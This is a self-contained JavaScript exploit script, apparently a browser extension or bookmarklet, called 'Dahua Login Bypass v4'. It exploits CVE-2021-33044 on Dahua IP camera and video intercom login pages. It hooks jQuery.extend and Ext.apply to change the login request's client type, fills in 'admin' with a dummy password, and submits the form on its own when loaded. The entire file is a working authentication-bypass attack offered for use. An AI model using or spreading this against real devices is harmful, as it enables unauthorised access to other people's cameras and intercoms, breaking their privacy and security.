(function loginBypass() {
	function HtmlAttributeEncode(str) {
		let sb = [];
		for (let i = 0; i < str.length; i++)
			switch (str.charAt(i)) {
				case '"':
					sb.push("&quot;");
					break;
				case '\'':
					sb.push("&#39;");
					break;
				case '&':
					sb.push("&amp;");
					break;
				case '<':
					sb.push("&lt;");
					break;
				case '>':
					sb.push("&gt;");
					break;
				default:
					sb.push(str.charAt(i));
					break;
			}
		return sb.join('');
	}

	function MakeExtendOverride(originalMethod) {
		return function () {
			let extended = PLACEHOLDER.apply(window, arguments);
			if (extended
				&& typeof extended.userName !== "undefined"
				&& extended.password
				&& extended.clientType === "Web3.0"
			) {
				extended.clientType = "NetKeyboard";
			}
			return extended;
		}.toString().replace('PLACEHOLDER', originalMethod);
	}

	let allSelectorSets = [
		{ user: '#login_user', pass: '#login_psw', login: 'a[btn-for="onLogin"]' },
		{ user: '#loginUsername-inputEl', pass: '#loginPassword-inputEl', login: '#loginButton' }
	];
	let pageSelectors = null;
	for (let i = 0; i < allSelectorSets.length; i++) {
		let s = allSelectorSets[i];
		if (document.querySelector(s.user) && document.querySelector(s.pass) && document.querySelector(s.login)) {
			pageSelectors = s;
			break;
		}
	}
	if (!pageSelectors) {
		if (!confirm("This page was not identified as a Dahua login page. Run Login Bypass script anyway?"))
			return;
	}

	if (window.bypassLoaded) {
		alert('Dahua Login Bypass has already been loaded on this page. Please reload the page if you want to try again.');
		return;
	}
	window.bypassLoaded = true;

	let hackMenu = '<div style="margin-bottom: 10px; font-size: 18px;">Dahua Login Bypass v4 &#10024;</div>';
	hackMenu += '<div style="margin-bottom: 10px;">This extension exploits CVE-2021-33044 to bypass authentication in Dahua IP cameras and VTH/VTO (video intercom) devices. '
		+ 'For other device types (NVR/DVR/XVR, etc), there exists CVE-2021-33045 which cannot be exploited with an ordinary web browser.</div>'
		+ '<div style="margin-bottom: 10px;">These vulnerabilities are likely to be fixed in firmware released after Sept 2021.</div>';
	hackMenu += '<div style="margin-bottom: 10px;">Credit for discovering the vulnerabilities: <a style="color:#3367d6" href="https://github.com/mcw0" target="_blank">bashis</a></div>';
	hackMenu += '<div>';

	hackMenu += '<input type="button" id="dlb_method_1" class="u-button" style="width: 250px;" value="Enable Authentication Bypass" title="CVE-2021-33044" onclick="'
		+ 'if (!window.didAlreadyOverrideExtend) { '
		+ 'window.didAlreadyOverrideExtend = true; '
		+ 'if (typeof jQuery !== &quot;undefined&quot; && jQuery.extend) { '
		+ ' var originalJqExtend = jQuery.extend; '
		+ ' jQuery.extend = ' + HtmlAttributeEncode(MakeExtendOverride('originalJqExtend')) + ';'
		+ '}'
		+ 'if (typeof Ext !== &quot;undefined&quot; && Ext.apply) { '
		+ ' var originalExtApply = Ext.apply; '
		+ ' Ext.apply = ' + HtmlAttributeEncode(MakeExtendOverride('originalExtApply')) + ';'
		+ '}'
		+ (pageSelectors ? (''
			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.user) + '\').value = &quot;admin&quot;; '
			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.pass) + '\').value = &quot;Not Used&quot;; '
			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.login) + '\').click(); '
			+ 'document.querySelector(\'#dlb_menu\').innerText = \'Authentication Bypass Enabled\'; '
		) : (''
			+ 'document.querySelector(\'#dlb_menu\').parentNode.removeChild(document.querySelector(\'#dlb_menu\')); '
			+ 'alert(\'Authentication Bypass Enabled. Please attempt to log in now using any fake credentials.\'); '
			+ '')
		)
		+ '}'
		+ '" />';


	hackMenu += '</div>';

	let div = document.createElement('div');
	div.id = "dlb_menu";
	div.style.fontSize = '12px';
	div.style.marginTop = '10px';
	div.style.padding = '20px';
	div.style.backgroundColor = '#FFFFFF';
	div.style.border = '3px solid rgba(0,0,0,1)';
	div.style.borderRadius = '8px';
	div.style.boxShadow = '0 0 16px rgb(0 0 0 / 50%)';
	div.style.backdropFilter = 'filter: blur(8px)';
	div.style.position = 'relative';
	div.style.left = '-72px';
	div.innerHTML = hackMenu;
	if (pageSelectors)
		document.querySelector(pageSelectors.login).parentNode.appendChild(div);
	else {
		div.style.position = 'absolute';
		div.style.top = '0px';
		div.style.left = '0px';

		document.body.appendChild(div);
	}
	document.getElementById("dlb_method_1").click();
})();